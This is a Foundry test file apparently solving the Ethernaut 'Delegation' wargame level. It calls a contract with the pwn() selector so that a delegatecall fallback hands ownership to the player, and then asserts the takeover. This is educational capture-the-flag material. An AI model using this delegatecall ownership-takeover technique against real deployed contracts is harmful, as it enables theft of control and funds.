// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Delegation, Delegate} from "../../src/06/Delegation.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {DelegationFactory} from "src/06/DelegationFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract DelegationTest is Test, BaseTest {
    Delegation public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new DelegationFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = Delegation(instance);
    }

    function testIsCorrectOwnerOfInstanceContract() public view {
        assert(instanceContract.owner() == address(levelFactory));
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        //or (bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
        (bool success,) = address(instanceContract).call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(success, "Call failed");

        vm.stopPrank();

        assert(instanceContract.owner() == player);
        assertEq(address(instanceContract).balance, 0);
    }
}
